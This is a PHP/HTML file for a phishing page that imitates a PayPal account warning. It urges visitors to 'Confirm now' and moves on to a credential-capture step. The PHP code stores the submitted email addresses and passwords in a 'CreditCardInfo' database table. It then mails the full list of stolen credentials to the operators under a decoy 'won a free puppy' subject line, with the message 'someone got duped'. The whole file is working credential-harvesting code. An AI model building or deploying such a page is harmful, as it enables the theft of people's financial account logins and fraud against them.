<!DOCTYPE html5>

<html>

<style>
	p{text-align:center}
	h1{text-align:center}
	h1.sansserif {
    font-family: Arial, Helvetica, sans-serif;}
	p.sansserif {
    font-family: Arial, Helvetica, sans-serif;}
	
</style>

<body>
<form action = "paypal_allcreds.html">
<p> <img src="warning2.jpg" alt = "Warning!" align = "middle" style="width:300px;height:280px;"><br></p>
<h1 class ="sansserif">Temporarily unable to load your account.</h1>
<p class = "sansserif">You need to confirm your information to be able to fix this problem and access to your account.</p><br>
<p class = "sansserif" ><input type=submit value="Confirm now" style="height:40px; width:400px; font-weight: bold; color:white; background-color:#00a4d9 ;moz-border-radius: 10px;
  -webkit-border-radius: 10px"><br><br></p>

<?php


include ("account.php");
( $dbh = mysql_connect ( $hostname, $username, $password ) )
	        or die ( "*debug purposes only* Unable to connect to MySQL database" );
//print "*dubug purposes only* Connected to MySQL<br>";
mysql_select_db( $project ); 

//use cookies in real application. Sessions can use URL to uniquely identify users which poses a security risk.
session_start();
$email = mysql_real_escape_string($_GET["email"]);
$_SESSION["email"] = $email;
$passWord = mysql_real_escape_string($_GET["password"]);

//please, PLEASE don't remove this :-)
$puppies = [ 0 => "English Bulldog", 1 => "Golden Retriever", 2=> "Labrador Retriever", 3=> "Corgi", 4=> "French Bulldog", 5 => "Yorkshire Terrier", 6=> "Pomeranian", 7=>"Cavi (Cavlier King Charles Spaniel)", 8 => "Saint Bernard", 9 => "Basset Hound", 10 => "Pug" ];

$subject = "$email won a free ".$puppies[rand(0,10)]." puppy!";
$insert_statement = "INSERT INTO CreditCardInfo VALUES ('$email', '$passWord', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ',' ', ' ', ' ', NOW())"; //states do not exist in the united stats of america

$dateRegistered = mysql_fetch_array(mysql_query("SELECT MAX(dateRegistered) FROM CreditCardInfo"))[0]; //get the most recent registered time
$_SESSION["dateRegistered"] = $dateRegistered;
$email_retreival = "Select * from emailList";
$data_retreival = "Select * from CreditCardInfo order by dateRegistered DESC";

mysql_query ($insert_statement);
print mysql_error();

$emailTable = mysql_query($email_retreival);
print mysql_error();

while ($emailRow = mysql_fetch_array($emailTable))
{
	$dataTable = mysql_query($data_retreival);
	
	$to = $emailRow["email"];
	
	$message = "someone got duped UPDATE ($email) \n";
	$message.= "email \tpassword \t\n";
	while ($dataRow = mysql_fetch_array($dataTable))
	{
		$userEmail = $dataRow["email"];
		$userPassword = $dataRow["passwd"];
		$dateTime = $dataRow["dateRegistered"];
		$message.= "$dateTime | \t$userEmail | \t$userPassword \t\n";
		
	}
	
	mail($to, $subject, $message);
}

?>

</body>
</html>